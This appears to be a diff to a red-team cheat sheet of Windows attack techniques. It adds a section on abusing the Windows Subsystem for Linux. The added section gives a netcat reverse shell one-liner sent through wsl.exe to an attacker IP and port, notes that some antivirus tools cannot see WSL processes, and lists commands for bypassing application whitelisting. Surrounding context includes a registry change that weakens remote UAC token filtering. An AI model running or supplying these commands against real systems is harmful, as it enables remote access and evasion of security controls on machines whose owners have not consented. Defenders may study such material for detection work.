@@ -12,6 +12,7 @@
 * [Defense evasion](#Defense-evasion)
 * [AV Bypass](#AV-Bypass)
 * [Privileges](#Privileges)
+* [Windows Subsystem for Linux WSL](#Windows-Subsystem-for-Linux-WSL)
 
 ## General
 #### Get all GPO's applied to a machine
@@ -351,4 +352,23 @@ secedit /configure /db secedit.sdb /cfg secpolicy.inf /overwrite /areas USER_RIG
 ```
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1 /f
 Get-service LanmanServer | restart-service -verbose
+```
+
+## Windows Subsystem for Linux WSL
+- AVs which do not use Pico process APIs have no visibility of the processes executed using WSL. This provides better chances of bypass.
+- With the additional Linux tooling included (like Python), WSL increases the attack surface of a machine and the opportunities to abuse the new functionality.
+
+#### Netcat shell
+```
+wsl.exe mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc <IP> <PORT> 1>/tmp/backpipe
+```
+
+#### Bypass whitelisting
+- In both the above cases, the Windows application will have:
+  – Same permissions as the WSL process. 
+  – Run as the current Windows user.
+  – Uses the working directory as the WSL command prompt. That is we can access the Windows file system from WSL.
+```
+bash.exe -c cmd.exe
+wsl.exe cmd.exe
 ```
